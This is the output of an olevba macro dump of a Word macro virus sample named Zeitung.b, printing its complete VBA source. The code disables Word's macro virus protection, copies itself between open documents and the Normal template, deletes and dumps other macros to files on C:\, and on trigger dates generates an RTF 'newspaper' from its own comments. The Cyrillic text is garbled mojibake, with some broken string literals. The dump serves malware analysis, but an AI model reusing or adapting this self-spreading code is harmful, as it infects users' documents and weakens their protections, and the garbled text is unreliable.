olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Zeitung.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Zeitung.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Const Signature = "VirusZeitung" '耔沩囹箴?忤痼襦
'梵 钿?狸溟皂疴觊 腙噤 翦? 栲胴螂釦吗耨玎?疣?栲羼?厘耥鹋痨忤条?噜
'2
'眍戾?2 玎 2000 泐
Dim sd, reg As Boolean
Private Function Kontaminat(O)
 If Not O.codemodule.Find(Signature, 1, 1, 100, 100) Then
  Kontaminat = 0
 Else
  If O.codemodule.countoflines < 50 Then
   Kontaminat = 0
  Else
   Ant$ = Trim(O.codemodule.lines(3, 1))
   Ant$ = Trim(Mid(Ant$, 2, Len(Ant$) - 1))
   If Val(Ant$) < 65535 Then
    Kontaminat = Val(Ant$)
   Else
    Kontaminat = -1
   End If
 End If
 End If
End Function
Private Sub Document_Open()
 On Error Resume Next
 Dim ad, nt As Object
 Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
 Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
 If Mid(ActiveDocument.Name, 1, 12) = "冷耜栝 钽铐? Then
  Exit Sub
 End If
 reg = False
 p = 0.05
 Tag$ = ""
 Monat$ = ""
 datum$ = Trim(Date)
 i = 1
 While (Mid(datum$, i, 1) <> ".") And (i < Len(datum$))
  Tag$ = Tag$ + Mid(datum$, i, 1)
  i = i + 1
 Wend
 i = i + 1
 While (Mid(datum$, i, 1) <> ".") And (i < Len(datum$))
  Monat$ = Monat$ + Mid(datum$, i, 1)
  i = i + 1
 Wend
 If (Val(Monat$) = 2) And (Val(Tag$) = 2) Then p = 2 ' 2  翦怵嚯�
 If (Val(Monat$) = 3) And (Val(Tag$) = 21) Then p = 2 ' 21 爨痱
 If (Val(Monat$) = 4) And (Val(Tag$) = 30) Then p = 2 ' 30 囡疱?
 If (Val(Monat$) = 6) And (Val(Tag$) = 21) Then p = 2 ' 21 棹?
 If (Val(Monat$) = 8) And (Val(Tag$) = 2) Then p = 2 ' 2  噔泱耱
 If (Val(Monat$) = 9) And (Val(Tag$) = 21) Then p = 2 ' 21 皴眚�狃�
 If (Val(Monat$) = 10) And (Val(Tag$) = 31) Then p = 2 ' 31 铌?狃�
 If (Val(Monat$) = 12) And (Val(Tag$) = 21) Then p = 2 ' 21 溴赅狃�
 If Rnd >= p Then
  Exit Sub
 End If
 Documents.Add Template:="Normal", NewTemplate:=False
 With ActiveDocument.PageSetup
      .LineNumbering.Active = False
      .Orientation = wdOrientPortrait
      .TopMargin = CentimetersToPoints(1.5)
      .BottomMargin = CentimetersToPoints(1.5)
      .LeftMargin = CentimetersToPoints(2.5)
      .RightMargin = CentimetersToPoints(2)
      .Gutter = CentimetersToPoints(0)
      .HeaderDistance = CentimetersToPoints(1.25)
      .FooterDistance = CentimetersToPoints(1.25)
      .PageWidth = CentimetersToPoints(21)
      .PageHeight = CentimetersToPoints(29.7)
      .FirstPageTray = wdPrinterDefaultBin
      .OtherPagesTray = wdPrinterDefaultBin
      .SectionStart = wdSectionNewPage
      .OddAndEvenPagesHeaderFooter = False
      .DifferentFirstPageHeaderFooter = False
      .VerticalAlignment = wdAlignVerticalTop
      .SuppressEndnotes = False
      .MirrorMargins = False
 End With
 Druck_0 "??????  ?????, 40, True, wdAlignParagraphCenter, 0, False"
 Druck_0 "妈痼耥? 汔珏蜞 皴牝?桁. 逆. 蔫 ?? 叔腚?", 18, False, wdAlignParagraphLeft, 0, True
 Druck_0 "蔓躅?镱 戾疱 觐祜脲牝钼囗? 眍戾疣", 18, False, wdAlignParagraphLeft, 0, True
 Druck_0 "10 爨�  2000  ?   ?2 (2)", 18, False, wdAlignParagraphLeft, 0, True
 Selection.TypeParagraph
 Druck_0 "彦泐漤� ?眍戾疱:", 18, True, wdAlignParagraphLeft, 0, True
 Druck_0 "* 添屙? 麒蜞蝈脲??汔珏蝈. (项溽铕赅 桧蝈疴��)", 18, False, wdAlignParagraphLeft, 0, True
 Druck_0 "* 橡邃腩驽龛� 镱 箅篦�屙�?疣犷螓 汔珏螓:", 18, False, wdAlignParagraphLeft, 0, True
 Druck_0 "** 帖 耦忮瘌屙耱怏屐 疋铋 忤痼?", 18, False, wdAlignParagraphLeft, 0, True
 Druck_0 "** 袜耔朦眍 扈?礤 狍溴��.", 18, False, wdAlignParagraphLeft, 0, True
 Druck_0 "** 砚铋 忤痼?- 疋铊扈 痼赅扈. ", 18, False, wdAlignParagraphLeft, 0, True
 Druck_0 "** 帖 - 忄? 恹 - 磬?(?镳钺脲爨?钺疣蝽铋 疋�玷). ", 18, False, wdAlignParagraphLeft, 0, True
 Druck_0 "* 袜�� 镫囗?", 18, False, wdAlignParagraphLeft, 0, True
 Selection.TypeParagraph
 Druck_0 "******************************", 18, True, wdAlignParagraphCenter, 0, True
 Selection.TypeParagraph
 vb = 1
 ve = 1
 reg = True
 vb = Artikel_B(nt, vb, 1)
 ve = Artikel_E(nt, vb + 1)
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb, 1), 18, True, wdAlignParagraphCenter, 0, True
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(ve, 1), 14, False, wdAlignParagraphJustify, 1.5, True
 vb = Artikel_B(nt, ve, 2)
 ve = Artikel_E(nt, vb + 1)
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb, 1), 14, True, wdAlignParagraphLeft, 0, True
 Druck_0 nt.codemodule.lines(vb + 1, 1), 14, False, wdAlignParagraphJustify, 1.5, True
 Druck_0 nt.codemodule.lines(ve, 1), 14, False, wdAlignParagraphJustify, 1.5, False
 For art = 3 To 6
  vb = Artikel_B(nt, ve, art)
  ve = Artikel_E(nt, vb + 1)
  Selection.TypeParagraph
  Druck_0 nt.codemodule.lines(vb, 1), 14, True, wdAlignParagraphLeft, 1.5, True
  For v = vb + 1 To ve
   Druck_0 nt.codemodule.lines(v, 1), 14, False, wdAlignParagraphJustify, 1.5, True
  Next v
 Next art
 vb = Artikel_B(nt, ve, 7)
 ve = Artikel_E(nt, vb + 1)
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb, 1), 14, True, wdAlignParagraphLeft, 1.5, True
 Druck_0 nt.codemodule.lines(vb + 1, 1), 14, False, wdAlignParagraphJustify, 1.5, True
 Selection.TypeParagraph
 For v = vb + 2 To ve
  Druck_0 nt.codemodule.lines(v, 1), 14, True, wdAlignParagraphRight, 1.5, True
 Next v
 Selection.TypeParagraph
 Selection.TypeParagraph
 For art = 8 To 11
  vb = Artikel_B(nt, ve, art)
  ve = Artikel_E(nt, vb + 1)
  Selection.TypeParagraph
  Druck_0 nt.codemodule.lines(vb, 1), 18, True, wdAlignParagraphCenter, 0, True
  Selection.TypeParagraph
  For v = vb + 1 To ve - 1
   Druck_0 nt.codemodule.lines(v, 1), 14, False, wdAlignParagraphJustify, 1.5, True
  Next v
  Selection.TypeParagraph
  Druck_0 nt.codemodule.lines(ve, 1), 14, True, wdAlignParagraphRight, 0, True
  Selection.TypeParagraph
 Next art
 Selection.TypeParagraph
 vb = Artikel_B(nt, ve, 12)
 ve = Artikel_E(nt, vb + 1)
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb, 1), 18, True, wdAlignParagraphCenter, 0, True
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb + 1, 1), 14, False, wdAlignParagraphJustify, 1.5, True
 Druck_0 nt.codemodule.lines(vb + 2, 1), 14, False, wdAlignParagraphJustify, 0, False
 Druck_0 nt.codemodule.lines(vb + 3, 1), 14, False, wdAlignParagraphJustify, 1.5, True
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb + 4, 1), 14, False, wdAlignParagraphLeft, 0, True
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb + 5, 1), 14, False, wdAlignParagraphJustify, 1.5, True
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(ve, 1), 14, True, wdAlignParagraphRight, 0, True
 Selection.TypeParagraph
 Selection.TypeParagraph
 vb = Artikel_B(nt, ve, 13)
 ve = Artikel_E(nt, vb + 1)
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb, 1), 18, True, wdAlignParagraphCenter, 0, True
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb + 1, 1), 14, False, wdAlignParagraphJustify, 1.5, True
 Druck_0 nt.codemodule.lines(vb + 2, 1), 14, False, wdAlignParagraphJustify, 1.5, True
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb + 3, 1), 14, True, wdAlignParagraphRight, 0, True
 reg = False
 Selection.TypeParagraph
 Druck_0 "*************************************", 14, False, wdAlignParagraphCenter, 0, True
 Druck_0 "喻疱滂蝈朦 - 襦蜞龛眈赅� 皴牝?桁屙?逆铐?蔫 ?蒌忄痄?叔腚?, 14, False, wdAlignParagraphCenter, 0, True"
 Druck_0 "秒噔睇?疱溧牝铕 - ? ? 亦疣耜桧", 14, False, wdAlignParagraphCenter, 0, True
 Druck_0 "蔫疱牝铕 - ? ? 髓耋眍?, 14, False, wdAlignParagraphCenter, 0, True"
 Druck_0 "棱蝾?桎彖 - ? ? 缅眍忄", 14, False, wdAlignParagraphCenter, 0, True
 Druck_0 "暑眈箅�蜞�?镱 忸镳铖囔 忤痼耦腩汨?-  ? ? 皖汨?, 14, False, wdAlignParagraphCenter, 0, True"
 Druck_0 "秒噔睇?镳钽疣祆桉?- ? ? 宣骖?, 14, False, wdAlignParagraphCenter, 0, True"
 Druck_0 "暑祜��蝈痦�� 磬犷??铘铕祀屙桢 - ? ? 求犷忄", 14, False, wdAlignParagraphCenter, 0, True
 Druck_0 "暑痧尻蝾?- ? ? 藻漕痤?, 14, False, wdAlignParagraphCenter, 0, True"
 Druck_0 "添屙桢 疱溧牿梃 祛驽?礤 耦怙噤囹??镱玷鲨彘 噔蝾痤?矬犭桕圉栝.", 14, False, wdAlignParagraphCenter, 0, True
 Druck_0 "橡?镥疱镥鬣蜿??桉镱朦珙忄龛?爨蝈痂嚯钼 耨�腙� 磬 汔珏蝮 礤钺�玎蝈朦磬.", 14, False, wdAlignParagraphCenter, 0, True
 Druck_0 "绣溧牿? 礤 礤皴?铗忮蝰蜮屙眍耱?玎 耦溴疰囗桢 矬犭桕箦禧?爨蝈痂嚯钼.", 14, False, wdAlignParagraphCenter, 0, True
 ActiveDocument.SaveAs FileName:="冷耜栝 钽铐??2", FileFormat:=wdFormatRTF, LockComments:=False, Password:="", AddToRecentFiles:=True, WritePassword:="", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:=False, SaveNativePictureFormat:=False, SaveFormsData:=False, SaveAsAOCELetter:=False
 ActiveDocument.Close
 Set nt = Nothing
 Set ad = Nothing
End Sub
Private Sub Document_Close()
 Dim ad, nt As Object
 Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
 Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
 On Error Resume Next
 Options.VirusProtection = False
 If (Kontaminat(ad) < Kontaminat(nt)) And ((ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate)) Then   '玎疣驽龛?嚓蜩忭钽?漕牦戾眚
  sd = ActiveDocument.Saved
  cofl = ad.codemodule.countoflines
  If cofl > 0 Then
   Open "C:\" + ActiveDocument.ActiveWindow.Caption + ".TXT" For Append As #1
   Print #1, "锑牮铖? 猁怿桢 ?漕牦戾眚?漕 忭邃疱龛� 忤痼襦"
   For v = 1 To cofl
    Print #1, ad.codemodule.lines(v, 1)
   Next v
   Close #1
   ad.codemodule.deletelines 1, cofl
  End If
  For v = 1 To nt.codemodule.countoflines
   If Trim(nt.codemodule.lines(v, 1)) <> "" Then
    ad.codemodule.insertlines v, nt.codemodule.lines(v, 1)
   End If
  Next v
  If (sd = True) And (Mid(ActiveDocument.ActiveWindow.Caption, 1, 8) <> "念牦戾眚") Then ActiveDocument.Save
 End If
 If Kontaminat(ad) > Kontaminat(nt) Then   '玎疣驽龛?�噌腩�?Normal
  sd = NormalTemplate.Saved
  cofl = nt.codemodule.countoflines
  If cofl > 0 Then
   Open "C:\NORMAL.TXT" For Append As #1
   Print #1, "锑牮铖? 猁怿桢 ?�噌腩�?Normal.dot"
   For v = 1 To cofl
    Print #1, nt.codemodule.lines(v, 1)
   Next v
   Close #1
   nt.codemodule.deletelines 1, cofl
  End If
  For v = 1 To ad.codemodule.countoflines
   If Trim(ad.codemodule.lines(v, 1)) <> "" Then
    nt.codemodule.insertlines v, ad.codemodule.lines(v, 1)
   End If
  Next v
  If sd = True Then NormalTemplate.Save
 End If
 Set nt = Nothing
 Set ad = Nothing
End Sub
Private Sub Druck_0(T As String, Siz, Bld, Alg, Ind, Abz)
 Selection.Font.Size = Siz '疣珈屦 �痂趄�
 Selection.Font.Bold = Bld '骅痦铖螯
 Selection.ParagraphFormat.Alignment = Alg '恹疣忭桠囗桢
 Selection.ParagraphFormat.FirstLineIndent = CentimetersToPoints(Ind) '铗耱箫
 If Abz Then Selection.TypeParagraph
 If reg Then
  Selection.TypeText Text:=Mid(T, 2, Len(T) - 1)
 Else
  Selection.TypeText Text:=T
 End If
End Sub
Private Function Artikel_B(O, start, num)
 If (start < 1) Or (start > O.codemodule.countoflines) Then
  Artikel_B = -1
  Exit Function
 End If
 While (O.codemodule.lines(start, 1) <> "'Articl #" + Trim(num)) And (start <= O.codemodule.countoflines)
  start = start + 1
 Wend
 Artikel_B = start + 1
End Function
Private Function Artikel_E(O, start)
 If (start < 1) Or (start > O.codemodule.countoflines) Then
  Artikel_E = -1
  Exit Function
 End If
 While (Mid(O.codemodule.lines(start, 1), 1, 9) <> "'Articl #") And (start <= O.codemodule.countoflines)
  start = start + 1
 Wend
 If start > O.codemodule.countoflines Then
  start = start - 1
 End If
 Artikel_E = start - 1
End Function
'Articl #1
'吓新凵 臀膛?论嘏??崖乓. 掏磐冗  兹依遗伺?
'蔓躅??疋弪 镥疴钽?眍戾疣 磬��?汔珏螓 耱嚯 礤铈桎囗眍耱�� 潆� 祉钽桴 膻溴? 桁妣��?溴腩 ?觐祜��蝈疣扈. 帖 镱戾�噱� 玟羼?礤犷朦��?镱溽铕牦 桧蝈疴��, 忡�螓??礤耜铍�觇� 麇腩忮? 怙屦恹?镱珥嚓铎桠�桴�� ?"冷耜桁 钽礤?. 袜溴屐?, 铐?漕耱囹铟眍 镱腠?镳邃耱噔?�� 耧尻蝠 祉屙栝 ?眍忸?汔珏蝈. 央邃箦?铗戾蜩螯, 黩?礤 怦?膻滂 耦汶帏嚯桉?磬 桧蝈疴��: 祉钽桢 桉稃螓忄�� 耔朦眍?铗怵帙屙桢 ?襦蜞龛耱囔 ?襦蜞龛眈觇?皴牝囔.
'Articl #2
'髓镟蝾忄 ? ?, 镟蝈眚钼邃 桤 "礼蝠圊囗�汔顼痤�?.
'?潴爨? 黩?锣�� 汔珏蜞 羼螯 镱脲珥彘��??眢骓铄 桤钺疱蝈龛? 湾 皴牮弪, 黩?皴轺囫 疋钺钿?镥鬣蜩 耋�羼蜮箦� 蝾朦觐 磬 狍爨沐, 觐痧箫鲨� 耱嚯?蝾蜞朦眍? ?镳羼襦 耧腩�� ??漕?腓驽?玎漤桷?怆囫蜩, ?礤 恹镱腠�弪 疋铄泐 磬珥圜屙?. 绵珏蜞, 觐蝾疣� 镱-磬耱?�屐� 疋钺钿磬 铗 赅觐泐-腓犷 觐眚痤? 疋屦躞, 耦忮瘌屙眍 礤钺躅滂爨. ?礤?羼螯 蝾朦觐 钿桧 礤漕耱囹铌: 耦忮瘌屙眍 礤镱?蝽? 赅?铖簌羼蜮?弪? 钺疣蝽? 疋�琰 戾驿?麒蜞蝈?扈 ?汔珏蝾? 篷腓 �, ?镳桁屦? 玎躅黧 磬镨襦螯 镨顸祛 ?礤? 镱 赅觐祗 噤疱耋 邈?铗镳噔栩? 捏爨? 磬?�蜩� 忸镳铖铎 磬漕 镱疣犷蜞螯. 署铎?怦邈?镳铟邈? 祉?铟屙?镱眇噔桦? 忄?爨蝈痂嚯 镱 磬鲨铐嚯�眍�?忸镳铖? 妙耧钿桧 燕矬汨?镱漤�?忮顸爨 嚓蝮嚯�眢� 蝈祗, 铖钺屙眍 潆� 磬�邈� 镳邃镳?蜩�. 亦? 沅?� 疣犷蜞? 溧忭?蝠遽箦蝰� 忪屮囹咫�耱�?镟痱梃 "型?. ?磬?痼耨觇?镱黩?礤 铖蜞腩顸, 磬 赅驿铎 耜铍��?龛狍潼 铗忮蝰蜮屙眍?镱耱?赅觐?龛狍潼 桧铕钿弼; 怙痤麇? 礤 狍潴 泐腩耠钼眍? ?磬��?豚犷疣蝾痂?疣犷蜞�� 8 麇腩忮? 桤 龛?痼耨觇?蝾朦觐 蝠铄, 聍栩? 戾?.
'务蜞朦睇? 邂疱殛? 箨疣桧赅, 耧篁噔���? ?囵噌铎, 蜞蜞痍? 钿磬, 忸钺�� 礤铒疱溴脲眄铋 疣耦忸?镳桧噤脲骓铖蜩 ?赅怅噻弼, 恹溧��栝 皴? 玎 痼耨觐泐. 如 痼耨觇?祉钽桢 矬蜞��? 耦 怦�觇扈 桧铕钿鲟扈 ?镫钿�?铗 龛?礤镱腠铞屙睇?溴蝈?镱塍牮钼铌, ?篦屙�� 皴牮弪囵屐 ?磬��?桧耱栩篁?疣犷蜞弪 耱囵�� 觐膑屙钽栝 邂疱? 镱 觐蝾痤祗 溧忭?镫圜弪 汔珙忄� 赅戾疣. 象耱?泐耧钿桧 燕矬汨?珥噱? 黩??祛屐 腓鲥 铐 怦邈溧 磬殇弪 �痤泐 耱铕铐龛赅 疋铄泐 溴豚. 篷腓 ��?忸珈铈眍, � 躅蝈豚 猁 珥囹? 赅?祛骓?怦蝮镨螯 ?镟痱棹 "畜耨觐?磬鲨铐嚯�眍� 邃桧耱忸".
'Articl #3
'绣珥桕 ? ?, 镳屣钿噔囹咫?烂矣.
'?躅蝈?猁 耜噻囹? 黩?礤 钿钺??锣�� 汔珏蝮, 蜞?赅?铐?镱 疋铄?耋蜩 镳羼蝮镯?, ?爨蝈痂嚯? 矬犭桕箦禧??礤? 蝾 驽 眍??镳羼蝮镯�� 踵疣牝屦. 痒栩帼 眢骓�� 磬镱祉栩?锣? 黩?龛牝?礤 铗戾??耱囹彘 鱼铍钼眍泐 觐溴犟? 镳邃篑爨蝠桠帼��?筱铍钼眢?铗忮蝰蜮屙眍耱?玎 耦玟囗桢 ?疣耧痤耱疣礤龛?觐祜��蝈痦�� 忤痼耦? 悟眍耔蝈朦眍 铒筢腓觐忄眄�� 爨蝈痂嚯钼 祛泱 耜噻囹? 黩?忄�� 膻滂 耔朦眍 痂耜簋? 耦钺��� 疋铊 羿扈腓? 昨?赅襦弪? 忄�邈� 燕矬汨磬, 蝾 铐 镳铖蝾 沩桎??觐珏? 疣忭?赅??拎痍帏钼. 杨忮瘌屙眍 耠篦嚅眍 � 箸磬? 牝?蜞觐?燕矬汨? ?赅觇?觐珉?桤 磬��?噤扈龛耱疣鲨?屐?镱祛汔��. 捏爨? 黩?邈?镱腓蜩麇耜? 溴�蝈朦眍耱?礤耦忪羼蜩爨 ?篦遽铋 ?烂矣.
'Articl #4
'骂邂钿桧 ? ? 镳屣钿噔囹咫?烂矣.
'添?赅驽蝰�, 黩?忄?忤痼?眢驿噱蝰� ?珥圜栩咫�眍� 篑钼屦�屙耱忸忄龛�, 蜞?赅?镳?镥疴铎 玎疣驽龛?铐 磬戾痱忸 忮�噱� Word ?耱疣溧弪 祉铈羼蜮铎 漯筱桴 礤漕疣犷蝾? ?潴爨? 黩?玎疣驵螯 漕牦戾眚??祛戾眚 桴 铗牮��? ?耦玟囗? 耦忮瘌屙眍 礤钺�玎蝈朦眍: 忸-镥疴��, ��?镳桠钿栩 ?玎忤襦龛? ?忸-怛铕�� 膻犷?耦玟囗睇?桦?铗牮�螓� 漕牦戾眚 钺�玎蝈朦眍 狍溴?玎牮��; 玎疣驽龛?镳?玎牮�蜩� 镳尻疣耥?玎疱觐戾礓钼嚯?皴? ?怦艴 耦玟囹咫彘 爨牮钼桊篑钼. 署铎?蝾泐, 忭邃疱龛?蝈犟蜞 汔珏螓 ?疱溧牝桊箦禧?漕牦戾眚 镱-祛屐?礤 耦怦屐 徨玮疱漤??磬耱疣桠噱?忄��?镱蝈眦栲朦睇?麒蜞蝈脲?镳铗桠 忄? 聋腩 猁 磬祉钽?箐钺礤?耦玟噔囹?耧弼栲朦睇?羿殡 ?玎镨覃忄螯 蝈犟?汔珏螓 ?礤泐. 朽眍 桦?镱玟眍 麒蜞蝈朦 钺磬痼骅?眍恹?羿殡?磬 滂耜??玎躅麇? ?龛扈 铉磬觐扈螯?. 翌沅?��?龛觐祗 礤 镳梓桧栩 怵邃?
'Articl #5
'伢汔邂 ? ? 桧驽礤?
'?潴爨? 黩?蜞赅� 汔珏蜞 耦忮瘌屙眍 礤钺躅滂爨 ?磬��?泐痤溴, 沅?铗 钺�黜�?镳羼覃 礤?龛赅觐泐 蝾腙? 蝾朦觐 铐?漕腈磬 磬躅滂螯? ?痼赅?礤 襦蜞龛耱钼, ?赅觐?腓犷 礤轵疣朦眍?沭箫稃 膻溴? 项龛爨弪? 疱?蜞, 忄�� 疱腓汨铉磬� 镳桧噤脲骓铖螯 铗蜞腙桠噱?膻溴?铗 忄? ?磬?耠钼?"襦蜞龛珈" ?"襦蜞龛耱? 恹琨忄�� 桧耱桧牝桠眍?铗怵帙屙桢, ??疱珞朦蜞蝈 忄�� 镱蝈眦栲朦睇?麒蜞蝈腓 镳铛钿�?扈祛 忄骓钽?磬麒磬龛�.
'燕?� 溧忭?筲脲赅��?镳钽疣祆桊钼囗桢? ?祉?赅驽蝰�, 黩?恹 皲咫嚯?磬耱?��?铗牮�蜩� ?钺豚耱?觐祜��蝈痦铋 忤痼耦腩汨? "忤痼耥铋 汔珏螓" (桦?"汔珏蝽钽?忤痼襦", 觐祗 赅?犷朦�� 眇噔栩?) 妁?龛牝? 镱 祛桁 疋邃屙?? 礤 溴豚? 蒡?铟屙?躅痤��, 黩?忄�� 汔珏蜞 铗牮��?潆� 怦艴, 钿磬觐 礤镱?蝽? 赅觇?钺疣珙?祛骓?磬镨襦螯 镨顸祛 ?疱溧牿棹 礤? 忮潼 磬耜铍��?� 镱?? 恹 礤 镳桠咫?疋铊 觐铕滂磬螓? 体? 蜞赕?桧蝈疱耋弪, 祛驽蝈 腓 蔓 镱戾�囹� 疣珥�� 钺?怆屙? ?疱觌囔?
'Articl #6
'谚祛眍?? ? 怵圜-锺桴栲蝠.
'佯噻?耜噫? 黩??忄��?溴脲 � 疣玑桊帼顸 耠噌? 眍 祉?赅驽蝰�, 黩?汶噔囵?忄��?皴牝??滂疱牝铕?汔珏螓 蝠遽箦蝰� 皴瘘彗眍?脲麇龛? 项-祛屐?铐?耱疣溧�� 爨龛彘 忮腓麒�, 觐蝾疣� 箧?漕忮豚 桴 漕 镳铗桠铒疣忭�� 溴轳蜮栝, ??溧朦礤轼屐 祛驽?镳桠羼蜩 ?蟒瘘祗. 翌 驽 襦祛?祛泱 耜噻囹?钺?怦屐 噔蝾瘃觐?觐腚尻蜩忮. 西屙?磬耱铕噫桠噱?蝾 钺耱?蝈朦耱忸, 黩?��?膻滂 铗牮��?镳桠钿�?疋铊 羿扈腓? 觐沅?耠邃钼嚯?猁 铈桎囹?铗 龛?爨犟桁嚯�眍� 耜瘥蝽铖蜩. 枢?怵圜 � 磬耱?蝈朦眍 疱觐戾礓簋 桁 镳铋蜩 钺耠邃钼囗桢 磬 镳邃戾?耦耱?龛� 桴 锺桴桕? 镱赅 妁?礤 镱玟眍.
'Articl #7
'锗痂蝾眍?? ?, 耱箐屙?
'铃珞耠钼眍, 龛赍?礤 觐眚痤腓痼屐? 汔珏蜞 礤钺躅滂爨, ?蝾, 赅?恹 邋 疣耧痤耱疣?弪?礤 桁邋?龛赅觐泐 珥圜屙?. 翌朦觐 忤痼?眢骓?礤祉钽?漕疣犷蜞螯, 黩钺?铐 礤 桉赅驵?疱溧牝桊箦禧?蝈犟? 疹蝈腩顸 猁 珥囹? 赅??忄?铖簌羼蜮?弪? 疋�琰 ?钺�羼蜮屙眍耱�??祛驽蝈 腓 恹 铌噻囹?觐黻疱蝽簋 镱祛�� ?赅觐?腓犷 溴脲? 湾朦? 腓 ?忄?镱戾�囹� 钺?怆屙? ?珥嚓铎耱忄? 篷腓 溧, 蝾 � 钺彖扈 痼赅扈 泐腩耋?玎 镳钿铍驽龛?忄�邈� 溴豚 ?溧朦礤轼簋 疣犷蝮 汔珏螓.
'暑痧羼镱礓屙螓:  ? ? 襄蝮躅?
'? ? 锣耔朦觐?
'? ? 左痂腩?
'? ? 襄蝠屙觐,
'??宣彡桧
'Articl #8
'美桥依 盐悄劳? 视睦 遗吓熊 ?
'袜 爨痱钼耜铎 �噌帏� 2000 泐溧 猁腩 耦玮囗?铗溴朦眍?玎皴溧龛??篦囫蜩屐 痼觐忸滂蝈脲?皴牝??痼觐忸?�邈� 耦耱噔?汔珏螓; 邈?蝈祛?耱嚯?镥瘃镥牝桠?溧朦礤轼邈?疣玮栩? 汔珏螓 "冷耜栝 钽铐?.
'?磬鬣脲 玎皴溧龛� 汶噔囵?皴牝?恹耱箫桦 ?耦钺�屙桢� ?礤钺躅滂祛耱?桉镳噔脲龛� 礤漕耱囹觐??疣犷蝈 汔珏螓, 觐蝾瘥?皲屦骅忄腓 邋 溧朦礤轼邋 疣耧痤耱疣礤龛? ?躅溴 镱耠邃钼噔��?玎 �蜩� 滂耜篑耔?猁腓 恹耜噻囗?祉钽铟桉脲眄�� 镳邃腩驽龛�, 镱溻屦汔怿桢? 钺耋驿屙棹 怦屐?篦囫蝽桕囔?玎皴溧龛�. 悟溴朦睇?镳邃腩驽龛� 猁腓 镳桧�螓 ?桉镱腠屙棹. 青 钽疣龛麇眄铖螯?戾耱?禧 镳桠钿桁 礤觐蝾瘥?桤 龛?
'隋蝾镨皴?皴牝? ? ? 泪滂赍邂
'Articl #9
'疼 盐屡胸磐岩掠盘 崖紊 氯杏
'袜 磬耱?��?祛戾眚 磬扈 镳钿咫囗?钽痤祉? 疣犷蜞 镱 疣耧痤耱疣礤龛?汔珏螓 "冷耜栝 钽铐? ?磬觐镫屙 礤爨臌?铒�� 桉镱朦珙忄龛� 觐祜��蝈痦�� 忤痼耦??觐眈蝠箨蜩忭�� 鲥?? 蚂羼蝈 ?蝈? 铗戾麇睇 铗溴朦睇?礤漕耱囹觇, 觐蝾瘥?狍潴?镳孱漕脲睇  躅溴 溧朦礤轼彘 疣犷螓.
'?鬣耱眍耱? 镱 铗琨忄?磬��?皴牝囗蝾? 忡�怿桴? 疣耧痤耱疣?螯 忤痼? 镳?玎疣驽龛?桁 汶噔眍泐 �噌腩�?NORMAL.DOT ?镥疴�� 疣?Word "玎忤襦弪"; 牮铎?蝾泐, 忤痼?怦蜞怆�弪 蝈犟?汔珏螓 ?疱溧牝桊箦禧?漕牦戾眚, 黩?礤 怦邈溧 桎弪 磬 镱朦珞 邈?疣玑铕麒忸耱?磬 �牮囗�, ?蜞赕?疣玟疣驵弪 镱朦珙忄蝈?. 项 耠钼囔 磬�邈� 觐眈箅�蜞眚�-忤痼耦腩汔 ? ? 皖汨磬 忤痼?镥疱沭箧屙 腓�龛�?溴蜞?扈, 觐蝾瘥?蝾朦觐 蝾痨铉�?邈?疣犷蝮.
'?篦弪铎 恹�羼赅玎眄钽� 猁腓 镳钼邃屙?镥疱泐忸瘥 ?噔蝾疣扈 忤痼襦, 觐蝾瘥?磬镨襦腓 邈?眍怏?忮瘃棹, 礤 桁妣��?溧眄�� 礤漕耱囹觐? 袜扈 猁腓 镳钼邃屙?怦羼蝾痤眄桢 桉稃蜞龛� 眍忸泐 忤痼襦 磬 觐祜��蝈疣?皴牝? 觐蝾瘥?镱赅玎腓 邈?耧铖钺眍耱?觐痧尻蝽?玎疣驵螯 膻猁?漕牦戾眚?Word.
'义镥瘘 蝈犟?汔珏螓 玎眍耔蝰� ?铗溴朦睇?羿殡 纛痨囹?.RTF, 觐蝾瘥?镱塍鬣弪 桁� "冷耜栝 钽铐??..." ?玎镨覃忄弪? 磬 滂耜. 软钽溧 ��?镳铛钿栩 礤玎戾蝽?潆� 镱朦珙忄蝈?.
'秒噔睇?镳钽疣祆桉?皴牝?  ? ? 宣骖
'Articl #10
'屠讶塑臀  倘? 团  劣呐剀.
